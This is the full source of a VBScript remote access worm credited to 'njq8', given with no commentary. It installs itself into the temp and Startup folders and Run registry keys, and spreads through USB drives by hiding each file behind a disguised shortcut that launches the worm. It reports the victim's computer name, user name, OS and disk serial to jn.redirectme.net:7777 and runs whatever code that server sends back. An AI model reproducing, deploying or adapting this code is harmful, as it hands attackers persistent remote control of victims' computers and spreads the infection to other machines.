'<[ coded bY njq8 ]>'
On Error Resume Next
dim sh ' shell
set sh =WScript.CreateObject("WScript.Shell")
dim fs ' filesystem
set fs= CreateObject("Scripting.FileSystemObject") 
dim host
host="jn.redirectme.net"
dim port
port=7777
dim DR
DR = sh.ExpandEnvironmentStrings("%temp%") & "\"
dim FN
FN ="Servieca.vbs"
dim fh
dim us
us="~"
ins
dim spl
spl="jnJnj"
dim i
i=0
while true
  dim a 
  a= split(post("ready",""),spl)
  select case a(0)
    case "exc"
      dim sa
      sa= a(1)
      execute sa
    case "uns"
      uns
  end select
  wscript.sleep 4000
  i = i + 1
  if i> 2 then
    i=0
    xins
  end if
wend

function ins
  on error resume next
  us= sh.regread("HKCU\njq8")
  if us="~" then
    if lcase( mid(wscript.scriptfullname,2))=":\" & lcase(fn) then
      us="y"
      sh.regwrite "HKCU\njq8", us, "REG_SZ"
    else
      us="n"
      sh.regwrite "HKCU\njq8", us, "REG_SZ"
    end if
  end if
  Err.Clear
  fs.CopyFile wscript.scriptfullname,dr & fn ,true
  set fh = fs.OpenTextFile( dr & fn, 8, false)
  if Err.Number>0 then
    wscript.quit
  end if
  xins
end function

sub xins
  on error resume next
  sh.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & fn, chrw(34) & dr & fn & chrw(34), "REG_SZ"
  sh.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & fn, chrw(34) & dr & fn & chrw(34), "REG_SZ"
  fs.copyfile wscript.scriptfullname, CreateObject("Shell.Application").NameSpace(&H7).Self.Path &"\" & fn ,true
  for each xx in fs.Drives
    if xx.isready then
      if xx.FreeSpace >0 then
        if xx.drivetype=1 then
          if fs.fileexists(xx.path & "\" & fn) then
            fs.getfile(xx.path & "\" & fn).Attributes=0
          end if
          fs.copyfile dr & fn , xx.path & "\" & fn,true
          For Each x In fs.GetFolder( xx.path & "\" ).Files
            wscript.sleep 1
            if instr(x.name,".") then
              if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" then
                x.Attributes = 2
                if ucase(x.name) <> ucase(fn) then
                  With sh.CreateShortcut(xx.path & "\" & x.name & ".lnk") 
                    .TargetPath = "cmd.exe"
                    .WorkingDirectory = ""
                    .Arguments = "/c start " & Replace(fn," ", ChrW(34) _
                    & " " & ChrW(34)) & "&start " & replace( x.name," ", ChrW(34) & " " & ChrW(34)) & " & exit"
                    .IconLocation = sh.regread("HKLM\SOFTWARE\Classes\" & sh.regread("HKLM\SOFTWARE\Classes\." & Split(x.name, ".")(UBound(Split(x.name, "."))) & "\") & "\DefaultIcon\")
                    if instr( .iconlocation,",")=0 then
                      .iconlocation = .iconlocation &",0"
                    end if
                    .Save()
                  end with
                end if
              end if
            end if
          Next
        end if
      end if
    end if
  next
  Err.Clear
end sub

function uns
  on error resume next
  fh.close
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & fn
  sh.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & fn
  fs.DeleteFile dr & fn ,true
  fs.DeleteFile CreateObject("Shell.Application").NameSpace(&H7).Self.Path &"\" & fn ,true
  for each xx in fs.Drives
    if xx.isready then
      if xx.FreeSpace >0 then
        For Each x In fs.GetFolder( xx.path & "\").Files
          On Error Resume Next
          if instr(x.name,".") then
            if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" then
              x.Attributes = 0
              if ucase(x.name) <> ucase(fn) then
                fs.deletefile(xx.path & "\" & x.name & ".lnk" )
              else
                fs.deletefile( xx.path & "\" & x.name )
              end if
            end if
          end if
        Next
      end if
    end if
  next
  wscript.quit
end function

function post(cmd ,da)
  post=""
  Dim o
  Set o = CreateObject("MSXML2.XMLHTTP")
  o.open "POST","http://" & host & ":" & port &"/" & cmd, false
  o.setRequestHeader "User-Agent:", inf
  o.send da
  post=o.responseText
end function

dim xinf
function inf
  on error resume next
  if xinf="" then
    dim s
    s="??"
    s = hwd
    inf = inf & s & "\"
    s="??"
    s= sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
    inf = inf & s & "\"
    s="??"
    s= sh.ExpandEnvironmentStrings("%USERNAME%")
    inf = inf & s & "\"
    s="??"
    Set a = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set aa = a.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each aaa in aa
      s= aaa.Caption 
      exit for
    Next
    inf = inf & s & "\\0.3\" & us &"\" & pid 
    xinf=inf
  else
    inf=xinf
  end if
end function

function HWD
  HWD="CH_??"
  On Error Resume Next
  Set a = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  Set aa = a.ExecQuery("SELECT * FROM Win32_LogicalDisk")
  For Each aaa In aa
    if aaa.VolumeSerialNumber<>"" then
      HWD= "CH_" & aaa.VolumeSerialNumber
      exit for
    end if
  Next
end function

Function PID
  PID=0
  on error resume next
  PID = GetObject("winmgmts:root\cimv2").Get("Win32_" &_
  "Process.Handle='" & _
  sh.Exec("mshta.exe").ProcessID & "'").ParentProcessId
End Function
